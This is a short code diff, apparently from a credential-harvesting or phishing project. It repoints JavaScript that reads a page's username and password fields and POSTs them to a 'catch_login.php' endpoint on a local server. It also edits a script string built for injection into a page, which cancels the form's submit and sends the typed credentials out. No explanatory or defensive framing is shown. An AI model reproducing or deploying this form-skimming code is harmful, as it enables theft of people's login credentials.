@@ -29,7 +29,7 @@
     const formData = new FormData();
     formData.append('username',document.getElementById('form_username').value); 
     formData.append('password',document.getElementById('form_password').value);
-    fetch('http://127.0.0.1:6969/login.php',
+    fetch('http://127.0.0.1:6969/catch_login.php',
       {
         method: 'POST',
         body: formData,
@@ -75,7 +75,7 @@
 
 
 var scriptOld = '<script> function sendData(e) {e.preventDefault();' +
-    'fetch(\'http://127.0.0.1:6969/login.php\',{method: \'POST\',body: JSON.stringify({username: document.getElementById(\'form_username\'), password: document.getElementById(\'form_password\')})})' +
+    'fetch(\'http://127.0.0.1:6969/catch_login.php\',{method: \'POST\',body: JSON.stringify({username: document.getElementById(\'form_username\'), password: document.getElementById(\'form_password\')})})' +
     '.then(response => console.log(response))' +
     '.catch(error => console.log(error));</script>';
 
